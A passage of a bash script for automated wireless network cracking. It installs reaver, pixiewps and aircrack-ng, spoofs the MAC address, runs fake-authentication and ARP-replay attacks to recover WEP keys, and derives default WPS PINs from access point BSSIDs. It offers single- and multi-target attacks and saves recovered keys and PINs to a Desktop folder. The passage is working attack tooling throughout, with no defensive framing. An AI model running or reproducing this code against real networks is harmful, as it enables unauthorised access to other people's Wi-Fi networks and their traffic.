       						    					max_si=${#Interface[$Count_INT]}
       						    			fi
       						        done
       						        NUM_INT_CHIP=$((NUM_INT_CHIP-1))
       						        max_s=${max_cs}
       					   			Nm_s=7
       					   			table
       					   			max_cs1=$max_s1
       					   			max_cs2=$max_s2
       					   			max_csd=$max_sd
       					   			max_s=${max_si}
       					   			Nm_s=9
       					   			table
       					   			max_si1=$max_s1
       					   			max_si2=$max_s2
       					   			max_sid=$max_sd
								    echo -e "[+] We found$Green ${NUM_INT_CHIP}$White monitor mode."
									echo ""
									max_si4=""
						   			for (( TS=$((${#max_sid}+1));TS<=9;TS++))
						   				do
						   					max_si4=${max_si4}-
						  			done
						            echo -e "${White} +${Yellow}----${White}+${Yellow}--${max_sid}${max_si4}---${max_csd}---${White}+"
						   			echo -e "${Yellow} |${Red} ID${Yellow} |${Cyan}  Interface${max_si2}${Yellow}  |${Green}  Chipset${max_cs2}${Yellow} |"
						   			echo -e "${White} +${Yellow}----${White}+${Yellow}--${max_sid}${max_si4}---${max_csd}---${White}+"
						   			If_Print_Num="$NUM_INT_CHIP"
						   			for (( c=1; c<=${Count_INT}; c++))
       						    		do
	     						  			If_Print
						   			done
						            echo -e "${White} +${Yellow}----${White}+${Yellow}--${max_sid}${max_si4}---${max_csd}---${White}+"
}
Ver_Mon_Fun() {
                           cou_mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
						   if [ $cou_mon -eq 1 ]
						        then
								    mon=`iwconfig 2>&1 | grep Mode:Monitor | awk '{print $1}'`
						   elif [ $cou_mon -gt 1 ]
						        then
								    Mode_Monitor_Print_Function
									echo ""
									echo ""
									V_number=0
									while [ "$V_number" != "1" ]
									        do
											  echo -en "\033[1A\033[2K"
						                      echo -e -n "\r${White}[+] select$Red number$White of interface to use for capturing [${Green}1-${NUM_INT_CHIP}$White]:$Green"
						                      read number
											  if [[ "$number" =~ ^[+-]?[0-9]+$ ]]
									             then
											         if [ $number -ge 1 ] && [ $number -le ${NUM_INT_CHIP} ]; then
											             V_number=1
														 mon=${Interface[$number]}
											         else
											             V_number=0
											         fi
											  else
											             V_number=0
											  fi
								    done
						   fi
}
Loading() {
                disown $PID
                Finish=0
                count=0
				echo ""
				echo -en "\033[1A\033[2K"
                while [ "$Finish" == 0 ]
                do
                  Ver_Ins=`ps -A | grep -w $PID`
                  if [ "$Ver_Ins" == "" ]
  	                 then
  	                     echo ""
  	                     echo -en "\033[1A\033[2K"
  	                     echo -ne "$White[${Green} ok ${White}] $End_Msg"
  	                     Finish=1
                  else
  	                     if [ "$count" -eq 1 ]
  	     	                then
  	                            echo -ne "\r$White[${Red}*   ${White}] $Wait_Msg"
  	                     elif [ "$count" -eq 2 ]
  	     	                then
  	     	                    echo -ne "\r$White[${Red} *  ${White}] $Wait_Msg"
  	                     elif [ "$count" -eq 3 ]
  	     	                then
  	     	                    echo -ne "\r$White[${Red}  * ${White}] $Wait_Msg"
  	                     else
  	     	                    echo -ne "\r$White[${Red}   *${White}] $Wait_Msg"
  	     	                    count=0
  	                     fi
                         Finish=0
                         count=$(($count+1))
                         sleep 0.2
                  fi
                done
                echo ""
}
Installation() {
                echo -ne "\r$white [${Red}wait${White}] $NOP not found ..."
				sleep 2
                dpkg -i $NOPI > /dev/null 2> /dev/null &
                PID="$!"
                disown $PID
                Finish=0
                count=0
				echo ""
				echo -en "\033[1A\033[2K"
                while [ "$Finish" == 0 ]
                do
                  Ver_Ins=`ps -A | grep -w $PID`
                  if [ "$Ver_Ins" == "" ]
  	                 then
  	                     echo ""
  	                     echo -en "\033[1A\033[2K"
  	                     echo -ne "$White [${Green} ok ${White}] Installation of$Green $NOP$White is done ."
  	                     Finish=1
                  else
  	                     if [ "$count" -eq 1 ]
  	     	                then
  	                            echo -ne "\r$White [${Red}*   ${White}] Please wait until the$Green $NOP$White is installed ."
  	                     elif [ "$count" -eq 2 ]
  	     	                then
  	     	                    echo -ne "\r$White [${Red} *  ${White}] Please wait until the$Green $NOP$White is installed ."
  	                     elif [ "$count" -eq 3 ]
  	     	                then
  	     	                    echo -ne "\r$White [${Red}  * ${White}] Please wait until the$Green $NOP$White is installed ."
  	                     else
  	     	                    echo -ne "\r$White [${Red}   *${White}] Please wait until the$Green $NOP$White is installed ."
  	     	                    count=0
  	                     fi
                         Finish=0
                         count=$(($count+1))
                         sleep 0.2
                  fi
                done
                echo ""
}
Ver_Pckg_Tools() {
	             reaver 2&> ${Temporary}/Ver_Reaver.txt 2> /dev/null
                 hash pixiewps 2> /dev/null
                 Ver_Pixiewps="$?"
                 Pixiewps_Version=`pixiewps 2>&1 | grep -w "Pixiewps" | cut -d" " -f3 | tr -d "." 2> /dev/null`
                 if [[ "$Pixiewps_Version" =~ ^[+-]?[0-9]+$ ]]
                 	then
                 		echo "" > /dev/null
                 else
                 		Pixiewps_Version="1"
                 fi
                 hash airmon-ng 2> /dev/null
                 Aircrack_Suite="$?"
				 Ver_Reaver=`cat ${Temporary}/Ver_Reaver.txt | grep 'mod by t6_x'`
                 VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                 VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
                 Tools_Folder=`ls -l | grep -E 'Tools$' | grep -E '^d'`
				 Uname=`uname -m`
				 Exit=0
				 rm -rf  ${Temporary}/Ver_Reaver.txt
				 echo ""
				 hash dpkg 2> /dev/null
				 hash_dpkg="$?"
				 if [ $hash_dpkg -eq 0 ]
				      then
				          Ver_libssl_dev=`dpkg -l | grep -w "libssl-dev"`
						  if [ "$Ver_libssl_dev" = "" ] && [ "$Tools_Folder" != "" ]
				               then
				                    if [ "$Ver_Pixiewps" -ge "1" ] || [ "$Ver_Reaver" = "" ]
				                    	then
										    NOP="Libssl-dev"
						                    if [ $Uname == 'i686' ]
		                   	                     then
												     NOPI="libssl-dev_1.0.2g-1_i386.deb"
								                     cd Tools/32bits
						                             Installation
						                             cd ../..
								                 else
												     NOPI="libssl-dev_1.0.2g-1_amd64.deb"
								                     cd Tools/64bits
									                 Installation
									                 cd ../..
				                            fi
				                    fi
				          elif [ "$Ver_libssl_dev" = "" ]
				          	  then
				          	      if [ "$Ver_Pixiewps" -ge "1" ] || [ "$Ver_Reaver" = "" ]
				                    	then
				          	                NOP="Libssl-dev"
				          	                echo -ne "\r$white [${Red}wait${White}] $NOP not found ..."
				          	                Exit=1
				          	                sleep 1
				          	      fi
				          fi
				          if [ "$Ver_Pixiewps" -ge "1" ] && [ "$Tools_Folder" != "" ] || [ "$Pixiewps_Version" -lt "12" ] && [ "$Tools_Folder" != "" ]
				               then
					                NOP="Pixiewps"
						            if [ $Uname == 'i686' ]
		                   	           then
								           NOPI="pixiewps_1.2.2_i386.deb"
								           cd Tools/32bits
						                   Installation
						                   cd ../..
						            else
								           NOPI="pixiewps_1.2.2_amd64.deb"
								           cd Tools/64bits
								           Installation
								           cd ../..
				                    fi
				          elif [ "$Ver_Pixiewps" -ge "1" ]
				               then
				                   NOP="Pixiewps"
				                   echo -ne "\r$white [${Red}wait${White}] $NOP not found ..."
				                   Exit=1
				          	       sleep 1
				          fi
				          if [ "$Ver_Reaver" = "" ] && [ "$Tools_Folder" != "" ]
				               then
					                NOP="Reaver"
						            if [ $Uname == 'i686' ]
		                   	           then
								           NOPI="reaver_1.5.2.1_i386.deb"
								           cd Tools/32bits
						                   Installation
						                   cd ../..
						            else
								           NOPI="reaver_1.5.2.1_amd64.deb"
								           cd Tools/64bits
								           Installation
								           cd ../..
				                    fi
				          elif [ "$Ver_Reaver" = "" ]
				               then
				                   NOP="Reaver"
				                   echo -ne "\r$white [${Red}wait${White}] $NOP not found ..."
				                   Exit=1
				          	       sleep 1
				          fi
				          if [ "$Aircrack_Suite" -gt 0 ] && [ "$Tools_Folder" != "" ]
				          	then
				          		NOP="Aircrack-ng"
						        if [ $Uname == 'i686' ]
		                   	       then
								       NOPI="aircrack-ng_1.2-0_rc4_i386.deb"
								       cd Tools/32bits
						               Installation
						               cd ../..
						        else
								       NOPI="aircrack-ng_1.2-0_rc4_amd64.deb"
								       cd Tools/64bits
								       Installation
								       cd ../..
				                fi
				          elif [ "$Aircrack_Suite" -gt 0 ]
				          	then
				          		NOP="Aircrack-ng"
				          		echo -ne "\r$white [${Red}wait${White}]${Red} $NOP${White} not found ..."
				                Exit=1
				          	    sleep 1
				          fi
				 else
				 	      if [ "$Ver_Pixiewps" -ge "1" ] && [ "$Tools_Folder" != "" ] || [ "$Pixiewps_Version" -lt "12" ] && [ "$Tools_Folder" != "" ]
				               then
						           Wait_Msg="Wait until the${Green} Pixiewps${white} is${Red} installed${White} ."
						           End_Msg="Installation of$Green Pixiewps$White is done ."
						           cd Tools
					               unzip pixiewps-master.zip > /dev/null 2> /dev/null &
					               PID="$!"
					               disown $PID
					               sleep 2.0
						           cd pixiewps-master/src
						           make > /dev/null 2> /dev/null && make install > /dev/null 2> /dev/null &
						           PID="$!"
						           Loading
						           cd ../..
						           rm -rf pixiewps-master
						           cd ..
						  elif [ "$Ver_Pixiewps" -ge "1" ]
						  	   then
						  	       NOP="Pixiewps"
				                   echo -ne "\r$white [${Red}wait${White}] $NOP not found ..."
				                   Exit=1
				          	       sleep 1
				          fi
				          if [ "$Ver_Reaver" = "" ] && [ "$Tools_Folder" != "" ]
				              then
						           Wait_Msg="Wait until the${Green} Reaver${white} is${Red} installed${White} ."
						           End_Msg="Installation of$Green Reaver$White is done ."
						           cd Tools
					               unzip reaver-wps-fork-t6x-master.zip > /dev/null 2> /dev/null &
					               PID="$!"
					               disown $PID
					               sleep 2.0
						           cd reaver-wps-fork-t6x-master/src
						           chmod +x configure
						           ./configure > /dev/null 2> /dev/null && make > /dev/null 2> /dev/null && make install > /dev/null 2> /dev/null &
						           PID="$!"
						           Loading
						           cd ../..
						           rm -rf reaver-wps-fork-t6x-master
						           cd ..
						  elif [ "$Ver_Reaver" = "" ]
						  	   then
						  	       NOP="Reaver"
				                   echo -ne "\r$white [${Red}wait${White}] $NOP not found ..."
				                   Exit=1
				          	       sleep 1
				          fi
				          if [ "$Aircrack_Suite" -gt 0 ]
				          	then
				          		NOP="Aircrack-ng"
				          		echo -ne "\r$white [${Red}wait${White}]${Red} $NOP${White} not found ..."
				                Exit=1
				          	    sleep 1
				          fi
				 fi
				 if [ $Exit -eq 1 ]
				 	then
				 	    exit_function
				 fi
}
WEP_function() {
	                                WEP_KILL=0
								    CAA=1
								    Quit=0
								    IVs=0
								    echo ""
								    echo -e "${White}  +${Yellow}------------------------------${White}+"
								    echo -e "${Yellow}  |${White} [${Red}+${White}]$Yellow all required arguments${Yellow}   |"
								    echo -e "${White}  +${Yellow}------------------------------${White}+"
								    echo ""
								    hash macchanger 2> /dev/null
								    Ver_Macchanger="$?"
								    if [ "$Ver_Macchanger" -eq "0" ]
								    	then
								    		echo -e "${Yellow}          >>${White} Macchanger${White} :"
								    		ifconfig $mon down 2> /dev/null
								    		macchanger -r $mon 2> /dev/null > ${Temporary}/MAC.txt
								    		ifconfig $mon up 2> /dev/null
								    		Current_MAC=`cat ${Temporary}/MAC.txt 2> /dev/null | grep "Current MAC" | awk '{print $3}'`
								    		Permanent_MAC=`cat ${Temporary}/MAC.txt 2> /dev/null | grep "Permanent MAC" | awk '{print $3}'`
								    		Type_Of_WC=`cat ${Temporary}/MAC.txt 2> /dev/null | grep "Permanent MAC" | cut -d" " -f4-`
								    		New_MAC=`cat ${Temporary}/MAC.txt 2> /dev/null | grep "New MAC" | awk '{print $3}'`
								    		echo -e "${Purple}             >>${White} Current MAC${White}   : ${White}${Current_MAC} ${White}."
								    		echo -e "${Purple}             >>${White} Permanent MAC${White} : ${Green}${Permanent_MAC} ${White}${Type_Of_WC} ."
								    		echo -e "${Purple}             >>${White} New MAC${White}       : ${Yellow}${New_MAC} ${White}."
								    fi
								    airodump-ng -c $CHANNEL --bssid $BSSID -w ${Temporary}/${BSSID} --output-format csv,cap $mon 2> /dev/null &
								    Airodump_PID="$!"
								    disown $Airodump_PID
								    tset
								    aireplay-ng -1 3 -a $BSSID -T 1 $mon | tee ${Temporary}/aireplay-ng_fakeauth.txt > /dev/null &
								    fakeauth_PID="$!"
								    disown $fakeauth_PID
								    while [ $Quit == 0 ]
								    do
								    	Ver_Aireplay_PID=`ps -A | grep ${fakeauth_PID}`
								    	CAA=`cat ${Temporary}/aireplay-ng_fakeauth.txt 2> /dev/null | grep -c "Sending Authentication Request"`
								    	if [ "$Ver_Aireplay_PID" == "" ]
								    		then
								    		    echo ""
										        echo -en "\033[1A\033[2K"
                           		                echo -ne "${Yellow}          >>${White} fake authentication${White} : ${Green}Success ${White}."
                           		                Quit=1
                           		        else
                           		        	    echo -ne "\r          ${Yellow}>>${White} fake authentication${White} : ${Green}${CAA} ${Red}Attempt${White}."
                           		        	    Quit=0
                           		        fi
								    done
								    echo ""
								    Current_Dir=`pwd`
								    cd "${Temporary}"
								    aireplay-ng -3 -b $BSSID $mon > ${Temporary}/aireplay-ng_arpreplay 2> /dev/null &
								    arpreplay_PID="$!"
								    disown $arpreplay_PID
								    cd "${Current_Dir}"
								    echo -e "${Yellow}          >>${Cyan} Captured${Green} IVs${White} { ${Red}After${White} 10000${Green} IVs${Red} the attack will start${White} } :${Green} 0${White} IVs ."
								    sleep 8.0
								    echo -en "\033[1A\033[2K"
								    while [ $IVs -lt 10000 ]
								    do
								    	IVs=`cat ${Temporary}/${BSSID}-01.csv 2> /dev/null | grep ${BSSID} | cut -d',' -f11 | sed -n '1'p | tr -d [:space:]`
								    	echo -ne "\r${Yellow}          >>${Cyan} Captured${Green} IVs${White} { ${Red}After${White} 10000${Green} IVs${Red} the attack will start${White} } :${Green} ${IVs}${White} IVs ."
								    	sleep 2
								    done
								    echo ""
								    echo -e "\r          ${Yellow}>>${Cyan} The Cracking process has${Green} started${Cyan} , Just wait${White} ."
								    aircrack-ng -s ${Temporary}/${BSSID}-01.cap | tee ${Temporary}/aircrack-ng_rslt.txt 2> /dev/null > /dev/null &
								    aircrack_PID="$!"
								    disown $aircrack_PID
								    count=0
								    while [ $WEP_KILL == 0 ]
						            do
						            	Ver_Aircrack_PID=`ps -A | grep ${aircrack_PID}`
						            	Wait_Msg="${Cyan}Captured${Green} ${IVs}${White} ."
						            	IVs=`cat ${Temporary}/${BSSID}-01.csv | grep ${BSSID} | cut -d',' -f11 | sed -n '1'p | tr -d [:space:]`
						                if [ "$Ver_Aircrack_PID" == "" ]
									        then
										        echo ""
										        echo -en "\033[1A\033[2K"
                           		                echo -ne "${Yellow}          >>${Cyan} The process of${Green} Airmon-ng${Cyan} has completed${Green} successfully${White}."
											    WEP_KILL=1
										    else
						                        if [ "$count" -eq 1 ]
  	     	                                       then
  	                                                   echo -ne "\r        ${Red}>   ${White} $Wait_Msg"
  	                                            elif [ "$count" -eq 2 ]
  	     	                                       then
  	     	                                           echo -ne "\r        ${Red} >   $Wait_Msg"
  	                                            elif [ "$count" -eq 3 ]
  	     	                                       then
  	     	                                           echo -ne "\r        ${Red}  >  $Wait_Msg"
  	                                            elif [ "$count" -eq 4 ]
  	     	                                       then
  	     	                                           echo -ne "\r        ${Red}   > $Wait_Msg"
  	     	                                    elif [ "$count" -eq 5 ]
  	     	                                       then
  	     	                                           echo -ne "\r        ${Yellow}>>>> $Wait_Msg"
  	     	                                    elif [ "$count" -eq 6 ]
  	     	                                       then
  	     	                                           echo -ne "\r        ${Yellow}     $Wait_Msg"
  	     	                                    elif [ "$count" -eq 7 ]
  	     	                                       then
  	     	                                           echo -ne "\r        ${Green}>>>> $Wait_Msg"
  	     	                                    elif [ "$count" -eq 8 ]
  	     	                                       then
  	     	                                           echo -ne "\r        ${Yellow}     $Wait_Msg"
  	     	                                           count=0
  	                                            fi
                                                count=$(($count+1))
											    WEP_KILL=0
											    sleep 0.2
									    fi
									done
									cr_date=`date`
						            Ver_Key=`cat ${Temporary}/aircrack-ng_rslt.txt 2> /dev/null | grep -i "KEY FOUND"`
						            if [ "$Ver_Key" != "" ]
						            	then
						                    Key_ASCII=$(echo -e '\x'$(cat ${Temporary}/aircrack-ng_rslt.txt 2> /dev/null | grep -i "KEY FOUND" | awk '{print $4}' | sed -r 's/:/\\x/g') 2> /dev/null)
						                    Key_HEX=$(cat ${Temporary}/aircrack-ng_rslt.txt 2> /dev/null | grep -i "KEY FOUND" | awk '{print $4}' | tr -d ":")
						                else
						                	Key=""
						            fi
						            if [ "$Key_ASCII" != "" ]
						            	then
						            	    echo ""
						            	    echo ""
						            	    echo " [+] ESSID      >> $ESSID" > ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									        echo " [+] BSSID      >> $BSSID" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									        echo " [+] Privacy    >> $PRIVACY" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
									        echo " [+] Channel    >> $CHANNEL" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt 
									        echo " [+] Hex Key    >> \"$Key_HEX\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt 
									        echo " [+] ASCII Key  >> \"${Key_ASCII}\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
											echo " [+] Date       >> $cr_date" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
											echo ""
											echo -e "${White} [+]${Yellow} ESSID      ${Red}>>${Cyan} $ESSID" 
									        echo -e "${White} [+]${Yellow} BSSID      ${Red}>>${Cyan} $BSSID"
									        echo -e "${White} [+]${Yellow} Privacy    ${Red}>>${Green} $PRIVACY"
									        echo -e "${White} [+]${Yellow} Channel    ${Red}>>${White} $CHANNEL"
									        echo -e "${White} [+]${Yellow} Hex Key    ${Red}>>${White} \"${Cyan}$Key_HEX${White}\""
									        echo -e "${White} [+]${Yellow} ASCII Key  ${Red}>>${White} \"${Green}${Key_ASCII}${White}\""
											echo -e "${White} [+]${Yellow} Date       ${Red}>>${White} $cr_date"
											echo ""
									        echo -e "$Yellow [+]$Green Congratulation (^_^) "
											echo ""
									else
										    echo ""
										    echo ""
										    echo ""
										    echo -e "$White               [${Red}!${White}]$White Sorry password not found , good luck next time."
											echo ""
									fi
									tset
						            kill -9 $Airodump_PID 2> /dev/null
						            kill -9 $arpreplay_PID 2> /dev/null
}
SELECT_CAPTURE_CRACK() {
	                       back=0
						   trap exit_function SIGINT
						   while [ "$back" == "0" ]
						   do
						     echo -ne '\033c'
							 echo -e "${White} +${Red}---------------------------------------------------------------------------------${White}+"
						     echo -e "${Red} |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BGreen Green$White this mean that device is vulnerable.${Red}                  |"
							 echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BYellow Yellow$White this mean that device is may be vulnerable or aren't.${Red}|"
							 echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BBlue Blue$White this mean that device is already cracked.              ${Red}|"
							 echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$Purple Purple$White this mean that device is has a default pin or aren't.${Red}|"
							 echo -e "${White} +${Red}---------------------------------------------------------------------------------${White}+"
						     echo -e ${Yellow}"  ID	${BWhite}BSSID            	 CH	SEC     PWR     CLIENT   ESSID"
						     echo -e $Purple" ~~~~   ~~~~~                    ~~     ~~~     ~~~     ~~~~~~   ~~~~~"
						     i=0
						     ti=0
						     while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY
								 do
								   v=0
								   length=${#MAC}
		                           PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		                           PRIVACY=${PRIVACY:0:4}
		                           if [ $length -ge 17 ]; then
			                            i=$(($i+1))
										if [ $i != 0 ]; then
										     d=1
										else
										     d=0
									    fi
			                            POWER=`expr $POWER + 100`
			                            CLIENT=`cat ${Temporary}/capture/clients.csv | grep $MAC`
										Ver_vun=`echo $MAC | cut -c 1-8`
			                          	if [ "$CLIENT" != "" ]; then
				                             CLIENT="Yes"
										else
								             CLIENT="No"
			                            fi
			                            if [ "$i" -lt "10" ]
			                            	then
			                            	    echo -e -n " ${Red}[${Yellow}0"$i"${Red}]\t"
			                            else
			                            	echo -e -n " ${Red}[${Yellow}"$i"${Red}]\t"
			                            fi
			                            CP=""
			                            CP=$(echo -e "$Vun_MAC_LIST" | grep -w "$Ver_vun")
										if [ "$CP" != "" ]
											then
												        v=1
										fi
									    Num_OF_PIN[$i]=0
									    Num_OF_MAC[$i]=0
									    CP=""
									    CP=$(echo -e "$Default_PIN_MAC_LIST" | grep "$Ver_vun" | awk -F"=" '{print $1}')
									    CP1=$(echo -e "$GENERATED_PIN_MAC_LIST" | grep "$Ver_vun")
									    if [ "$CP" != "" ]
									    	then
											     Num_OF_PIN[$i]=`echo $(($(($(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | wc -l)-$(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n 1p)))-1))`
											     Num_OF_MAC[$i]=`echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n 1p`
											     if [ "${Num_OF_PIN[$i]}" -ge "2" ]
											     	then
											     		for (( p=1; p<=${Num_OF_PIN[$i]}; p++))
									    					do
									    						declare PIN$(echo $MAC | tr -d ":")[$((p-1))]=$(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n $(($(($p+1))+${Num_OF_MAC[$i]}))'p')
									    				done
									    		 else
									    						declare PIN$(echo $MAC | tr -d ":")[1]=$(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n $(($(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n 1p)+2))'p')
									    		 fi
									    		 HHDP_GEN[$i]=0
									    		 HHDP[$i]=1
									    elif [ "$CP1" != "" ]
									    	then
									    		Num_OF_PIN[$i]="1"
									    		LAST_SIX_DIGITS=$(echo $MAC | awk -F":" '{print $4,$5,$6}' | tr -d " ")
												HEX_TO_DEC=$(printf '%d\n' 0x${LAST_SIX_DIGITS}) 2> /dev/null
												HALF_MAC=`expr '(' $HEX_TO_DEC '%' 10000000 ')'`   
												PIN=`expr 10 '*' $HALF_MAC`
												ACCUM=0                                                        
												ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`                                                          
												ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`                                            
												ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`                                                      
												ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
												ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
												ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
												ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`
												THE_REST=`expr $ACCUM '%' 10`
												CHECK_THE_REST=`expr '(' 10 '-' $THE_REST ')' '%' 10`
												PIN[$i]=$(printf '%08d\n' `expr $PIN '+' $CHECK_THE_REST`)
									    		HHDP_GEN[$i]=1
									    		HHDP[$i]=1
									    else
									    		HHDP[$i]=0
									    fi
									    BLUE_MAC=0
									    if [ $(cat ${Desktop_PATH}/Passwords\ \&\ Pins/${MAC}* 2> /dev/null | grep -i 'pin' | wc -l 2> /dev/null) -gt 0 ] || [ "$(cat ${Desktop_PATH}/Passwords\ \&\ Pins/${MAC}* 2> /dev/null | grep -i 'Key' | cut -d'"' -f2 2> /dev/null)" != "" ]
											then
											    echo -e -n $BBlue"$MAC\t"
											    BLUE_MAC=1
										elif [ "$v" == 1 ] || [ "$PRIVACY" == "WEP" ]
										    then
											    echo -e -n $BGreen"$MAC\t"
										elif [ "${HHDP[$i]}" == "1" ]
											then
												echo -e -n $Purple"$MAC\t"
									    else
								    		    echo -e -n $BYellow"$MAC\t"
										fi
										if [ "$v" == 1 ] && [ "$(echo $ESSID)" != "" ] && [ "$PRIVACY" != "WEP" ] && [ "$BLUE_MAC" -eq 0 ] || [ "${HHDP[$i]}" == 1 ] && [ "$(echo $ESSID)" != "" ] && [ "$PRIVACY" != "WEP" ] && [ "$BLUE_MAC" -eq 0 ]
											then
												ti=$(($ti+1))
												Vun_BSSID[$ti]=$MAC
										    	Vun_CHANNEL[$ti]=$CHANNEL
										    	Vun_ESSID[$ti]=$ESSID
										    	Vun_PRIVACY[$ti]=$PRIVACY
										    	Vun_SPEED[$ti]=$SPEED
										    	Vun_Num_OF_PIN[$ti]=${Num_OF_PIN[$i]}
										    	Vun_PIN[$ti]=${PIN[$i]}
										    	Vun_HHDP[$ti]=${HHDP[$i]}
										    	Vun_HHDP_GEN[$ti]=${HHDP_GEN[$i]}
										fi
										echo -e -n $BWhite"$CHANNEL\t"
										echo -e -n $BWhite"$PRIVACY\t"
										if [ $POWER -ge 40 ]
										     then
										         echo -e -n $Green"$POWER%\t"
										elif [ $POWER -ge 30 ]
										     then
											     echo -e -n $Yellow"$POWER%\t"
										else
										         echo -e -n $Red"$POWER%\t"
										fi
										if [ "$CLIENT" == "Yes" ]
										     then
										         echo -e -n $Green"$CLIENT\t"
										     else
											     echo -e -n $Red"$CLIENT\t"
										fi
										echo -e $BWhite"$ESSID\t"
			                            IDLENGTH=$IDLENGTH
			                            ESSID[$i]=$ESSID
			                            CHANNEL[$i]=$CHANNEL
			                            BSSID[$i]=$MAC
			                            PRIVACY[$i]=$PRIVACY
			                            SPEED[$i]=$SPEED
		                            fi
								 done < ${Temporary}/capture/capture-02.csv
						   echo ""
						   echo ""
						   SELECT_TO_CRACK
						   done
						   if [ "$back" == "1" ]
						        then
								    re="yes"
						   elif [ "$back" == "2" ]
						        then
								    re="no"
						   fi
}
SELECT_TO_CRACK() {
						   V_number=0
						   while [ "$V_number" != "1" ]
									        do
											  echo -en "\033[1A\033[2K"
						                      echo -n -e "${White}  [${Red}+${White}]$Blue Select${White} the ${Red}ID${White} of your target from$White [${Green}${d}${White}-${Green}${i}$White] or type${Green} All${White} for${Blue} Multi${White}-${Blue}attack${White} : "
						                      read  N_OB
						                      N_OB=`echo $N_OB | tr "[:upper:]" "[:lower:]"`
											  if [[ "$N_OB" =~ ^[+-]?[0-9]+$ ]]
											      then
											         if [ "$N_OB" -ge "$d" ] && [ "$N_OB" -le "$i" ]
											  	        then
											                V_number=1
											         else 
											                V_number=0
											         fi
											  elif [ "$N_OB" == "all" ]
											      then
											          V_number=1
											  else
											          V_number=0
											  fi
						   done
						   c=0
						   sw=0
						   MA=0
						   if [ "$N_OB" == "all" ]
						   		then
						   		for (( MA=1;MA<=${#Vun_BSSID[@]};MA++))
						   			do
						   				echo ""
						   				ESSID=${Vun_ESSID[$MA]}
						   				CHANNEL=$(echo ${Vun_CHANNEL[$MA]}|tr -d [:space:])
						   				BSSID=${Vun_BSSID[$MA]}
						  				PRIVACY=${Vun_PRIVACY[$MA]}
						   				SPEED=${Vun_SPEED[$MA]}
						  				ESSID="$(echo $ESSID)"
						  				PIN_NUM=${Vun_Num_OF_PIN[$MA]}
						  				PIN=${Vun_PIN[$MA]}
						  				HHDP=${Vun_HHDP[$MA]}
						  				HHDP_GEN=${Vun_HHDP_GEN[$MA]}
						  				MULTI_ATTACK=1
						   				CRACKING_PROCESS
						   		done
						   else
						   			echo ""
						   			idlenght=${IDLENGTH[$N_OB]}
						   			ESSID=${ESSID[$N_OB]}
						   			CHANNEL=$(echo ${CHANNEL[$N_OB]}|tr -d [:space:])
						   			BSSID=${BSSID[$N_OB]}
						  			PRIVACY=${PRIVACY[$N_OB]}
						   			SPEED=${SPEED[$N_OB]}
						  			ESSID="$(echo $ESSID)"
						  			PIN_NUM=${Num_OF_PIN[$N_OB]}
						  			PIN=${PIN[$N_OB]}
						  			HHDP=${HHDP[$N_OB]}
						  			HHDP_GEN=${HHDP_GEN[$N_OB]}
						  			MULTI_ATTACK=0
						  			MA="$N_OB"
						   			CRACKING_PROCESS
						   fi
}
CRACKING_PROCESS() {
                           Ver_Dir=`ls ${Desktop_PATH} | grep Passwords\ \&\ Pins 2> /dev/null`
						   if [ "$Ver_Dir" == "" ];then
								mkdir ${Desktop_PATH}/Passwords\ \&\ Pins
						   fi
						   Ver_p=`ls ${Desktop_PATH}/Passwords\ \&\ Pins | grep ${BSSID} 2> /dev/null`
						   Ver_PIN=0
						   Ver_KEY=""
						   if [ "$Ver_p" != "" ]
								then
									Ver_PIN=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/$BSSID* | grep -i 'pin' | wc -l`
									Ver_KEY=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/$BSSID* | grep -i 'Key' | cut -d'"' -f2`
									Ver_WEP=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/$BSSID* | grep -i 'WEP'`
								else
								    Ver_PIN=0
						   fi
						   Cracking_Retry=0
						   TIME2RE=10
						   while [ "$Cracking_Retry" -le "3" ] && [ "$TIME2RE" -ge "4" ]
						   		do
						   			Cracking_Retry=$(($Cracking_Retry+1))
						   if [ "$Ver_p" != "" ] && [ $Ver_PIN -gt 0 ] || [ "$Ver_KEY" != "" ]
								then
								    ESSID_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 1p | cut -c20-`
                                    BSSID_AC=`cat ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | sed -n 2p | cut -c20-`
                                    if [ "$Ver_WEP" != "" ]
                                    	then
